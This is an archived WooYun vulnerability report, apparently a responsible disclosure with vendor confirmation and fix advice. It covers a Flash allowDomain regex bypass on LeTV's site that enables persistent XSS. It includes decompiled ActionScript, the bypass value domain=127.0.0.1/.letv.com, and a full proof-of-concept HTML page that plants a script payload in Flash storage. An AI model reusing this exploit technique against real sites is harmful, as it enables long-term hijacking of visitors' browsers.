{"id": 44375, "wybug_id": "wooyun-2015-0100880", "wybug_title": "乐视网首页某处xss可导致rootkit（绕过）", "wybug_corp": "乐视网", "wybug_author": "香草", "wybug_date": "2015-03-12 11:49", "wybug_open_date": "2015-04-26 11:50", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["利用技巧", "应用安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-26：\t细节向公众公开  简要描述： 看到路人甲发了类似的，还被雷劈了，所以来了兴致，打开研究了一番，果然修复了，但是很快被绕过了，另外也求个雷劈 详细说明：  这个是路人甲发的漏洞 WooYun: 乐视网首页某处xss可导致rootkit 从他通过的漏洞代码来分析，原来的flash验证allowDomain是通过的location.href所以被这样的链接绕过了：http://appmaker.sinaapp.com/poc/com.letv.www/1.htm问题falsh:http://player.letvcdn.com/p/201501/30/11/StorageLetvPlayer.swf原漏洞分析的比较简单，我在这儿做一个比较详细发分析反编译了flash关键代码如下：\ntry             {                pageDomain = String(this.loaderInfo.parameters[\"domain\"]) || \"\";                loc2 = true;                switch (loc2)                 {                    case new RegExp(\"\\\\.letv\\\\.com$\").test(pageDomain):                    {                        break;                    }                    case new RegExp(\"\\\\.letv\\\\.cn$\").test(pageDomain):                    {                        break;                    }                    default:                    {                        pageDomain = \"www.letv.com\";                        break;                    }                }                flash.system.Security.allowDomain(pageDomain);                flash.system.Security.allowInsecureDomain(pageDomain);            }\n通过传入的domain设置allowDomain但是进行了正则验证RegExp(\"\\\\.letv\\\\.com$\")和RegExp(\"\\\\.letv\\\\.cn$\")都只限制了以letv.com和letv.cn结尾，于是我们可以通过设置：domain=127.0.0.1/.letv.com轻松绕过过滤，由于/后面相当于注释，所以设置后的allowDomain就为127.0.0.1让后继续看下面的代码：\nflash.external.ExternalInterface.addCallback(\"getVersion\", this.getVersion);                flash.external.ExternalInterface.addCallback(\"getItem\", this.getItem);                flash.external.ExternalInterface.addCallback(\"getCount\", this.getCount);                flash.external.ExternalInterface.addCallback(\"getAllItem\", this.getAllItem);                flash.external.ExternalInterface.addCallback(\"addItem\", this.addItem);                flash.external.ExternalInterface.addCallback(\"removeItem\", this.removeItem);                flash.external.ExternalInterface.addCallback(\"removeAll\", this.removeAll);                flash.external.ExternalInterface.addCallback(\"getRecord\", this.getRecord);                flash.external.ExternalInterface.addCallback(\"getAllRecord\", this.getAllRecord);                flash.external.ExternalInterface.addCallback(\"removeRecord\", this.removeRecord);                flash.external.ExternalInterface.addCallback(\"removeAllRecord\", this.removeAllRecord);其中addItem代码为： internal function addItem(arg1:String, arg2:Object):Boolean        {            var type:String;            var value:Object;            var so_storage:flash.net.SharedObject;            var loc1:*;            so_storage = null;            type = arg1;            value = arg2;            try             {                so_storage = flash.net.SharedObject.getLocal(com.letv.pluginsAPI.cookieApi.CookieAPI.COOKIE_STORAGE, \"/\");                so_storage.data[type] = value;                so_storage.flush();            }            catch (e:Error)            {                return false;            }            return true;        }\n这个是设置sharedObject的方法。于是我们到网页上去搜索.getItem看在哪些地方有调用,最后跟踪发现\ne.getLC = function() {        var e = this.getCookie(\"tj_lc\");        if (e) {            return e        }        e = LocalStore.read(\"lc\");        if (e) {            this.setCookie(\"tj_lc\", e)        } else {            e = \"\";            var t = 32;            while (t--) {                e += Math.floor(Math.random() * 16).toString(16)            }            if (LocalStore.isReady || !LocalStore.flash) {                LocalStore.write(\"lc\", e)            }        }        return e    };\n每次访问首页都会执行这个方法，其中LocalStore.read(\"lc\");就是调用flash的方法但是必须要tj_lc的值为空才会调用LocalStore.read(\"lc\");路人甲的方法是找了个letv的跨站修改tj_lc的值为空，其实根本不需要，因为每次打开浏览器第一次访问www.letv.com的时候tj_lc都是为空的，解决了调用的方法，那下面我们就来设置我们的跨站代码吧！\n<html><body>    \t<embed width=\"100%\" height=\"100%\" id=\"plugin\" name=\"plugin\" src=\"http://player.letvcdn.com/p/201501/30/11/StorageLetvPlayer.swf?domain=127.0.0.1/.letv.com\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\">\t<script>\tvar x=setInterval(\t\tfunction(){\t\t\tdocument.getElementById(\"plugin\").addItem(\"lc\",'\\\\\";alert(12);Stats.getLC=function(){LocalStore.read(\\'lc\\');};__flash_temp=\\'x\\';//\"')\t\t\t//为了可以长期rootkit，所以我们先修改getLc的方法，去掉设置cookie和LocalStore.write(\"lc\", e)的方法，阻止从新设置flash shareobject\t\t\tclearInterval(x);\t},100);\t</script>\t</body></html>\n这样我们每次打开浏览器访问letv.com都会触发了,达到了长期劫持的目的   漏洞证明：  访问 http://xiangchao.sinaapp.com/flash.htm后访问http://www.letv.com\n\n   修复方案：  1、flash验证可信域名正则修改2、addItem方法过滤特殊字符   版权声明：转载请注明来源 香草@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-03-12 12:27 厂商回复： 非常感谢关注乐视安全，再次联系开发进行修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-12 11:50 |    \t\tD_in \t\t\t( 普通白帽子  |\t\t\t        Rank:413 漏洞数:62        | 到我嘴里来)\t\t \n  我信洞主    \n     2015-03-12 13:54 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  威力巨大吧。    \n     2015-03-12 14:31 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  路人甲是二哥小号~    \n     2015-03-12 14:53 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  @泳少 原来是二哥发的    \n     2015-04-01 14:47 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @香草 约吗    \n     2015-04-02 12:10 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  @_Evil 谁啊，约    \n     2015-04-11 13:38 |    \t\tArthur \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:33        | USA，I am coming！！！！！)\t\t \n  艹啊！看不懂！看来我不适合呆在wooyun。。。。得专心学习了。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}